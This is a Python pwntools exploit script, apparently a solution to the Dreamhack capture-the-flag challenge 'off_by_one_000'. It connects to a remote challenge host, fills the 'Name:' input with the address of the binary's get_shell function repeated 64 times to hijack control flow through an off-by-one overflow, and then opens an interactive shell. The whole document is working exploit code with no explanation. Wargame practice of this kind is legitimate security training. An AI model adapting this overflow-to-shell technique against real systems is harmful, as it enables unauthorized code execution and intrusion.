from pwn import *

hosts = 'host1.dreamhack.games'
port = 23709

p = remote(hosts,port)

elf = ELF('./off_by_one_000')

get_shell = elf.symbols['get_shell']

payload = p32(get_shell)*64

p.recvuntil('Name:')
p.send(payload)

p.interactive()
